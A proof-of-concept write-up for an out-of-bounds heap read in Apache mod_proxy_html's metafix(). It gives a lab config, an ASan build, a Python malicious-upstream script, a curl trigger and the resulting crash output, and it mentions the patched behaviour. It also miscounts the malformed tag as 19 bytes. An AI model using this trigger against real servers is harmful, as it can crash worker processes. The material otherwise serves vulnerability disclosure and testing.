# PoC 141 - OOB read in mod_proxy_html metafix() over malformed META

`metafix()` advances with `while (!apr_isalpha(*++p));` after matching
`http-equiv`. A malformed `<meta http-equiv=>` at the bucket end causes the
scan to read past the bucket buffer.

## Setup

Lab httpd 2.4.66 with `mod_proxy`, `mod_proxy_http`, and `mod_proxy_html`.
We point a proxied location at a tiny upstream that emits a malformed META
tag at exactly the byte boundary. Build httpd with AddressSanitizer.

`conf/httpd.conf`:

```
ServerName localhost
Listen 127.0.0.1:8080
LoadModule mpm_prefork_module    modules/mod_mpm_prefork.so
LoadModule authz_core_module     modules/mod_authz_core.so
LoadModule proxy_module          modules/mod_proxy.so
LoadModule proxy_http_module     modules/mod_proxy_http.so
LoadModule proxy_html_module     modules/mod_proxy_html.so
LoadModule xml2enc_module        modules/mod_xml2enc.so
LoadModule unixd_module          modules/mod_unixd.so
LoadModule log_config_module     modules/mod_log_config.so

ErrorLog logs/error_log
LogLevel proxy_html:trace4

ProxyHTMLEnable On
ProxyHTMLMeta   On
ProxyPass        /up http://127.0.0.1:9000
ProxyPassReverse /up http://127.0.0.1:9000
```

Build:

```
CFLAGS="-fsanitize=address -O0 -g" LDFLAGS="-fsanitize=address" \
    ./configure --enable-proxy-html --enable-xml2enc && make
```

## Trigger

A malicious upstream that sends a malformed META at the end of the bucket
without trailing bytes. We use raw socket framing so APR sees a
length-delimited bucket with `<meta http-equiv=>` as its final 19 bytes:

```
python3 - <<'PY'
import socket, threading
def serve(c, _):
    c.recv(4096)
    body = b"xxxx<meta http-equiv=>"
    hdr = (b"HTTP/1.1 200 OK\r\n"
           b"Content-Type: text/html\r\n"
           b"Content-Length: %d\r\n"
           b"Connection: close\r\n\r\n" % len(body))
    c.sendall(hdr + body); c.close()
import socketserver
class S(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
class H(socketserver.BaseRequestHandler):
    def handle(self): serve(self.request, self.client_address)
S(("127.0.0.1",9000), H).serve_forever()
PY
```

Then:

```
curl -s http://127.0.0.1:8080/up/ >/dev/null
```

## Observed effect

ASan reports a 1-byte heap-buffer-overflow inside `metafix()`:

```
==pid==ERROR: AddressSanitizer: heap-buffer-overflow
READ of size 1 at 0x... thread T0
    #0 0x... in metafix modules/filters/mod_proxy_html.c:677
    #1 0x... in proxy_html_filter
```

Without ASan, the worker continues reading until it finds a byte that
satisfies `apr_isalpha`, which can be any adjacent heap byte. On some
allocator layouts this terminates on a benign letter and the request
completes; on others, the pool guard page triggers `SIGSEGV` and the
worker is replaced. `error_log` shows `AH01416` proxy-html parse failures
and intermittent `child pid <X> exit signal Segmentation fault (11)`.

The patched scan with `match_end` confines `p` to the regex match end and
the same input is skipped silently with no out-of-bounds read.
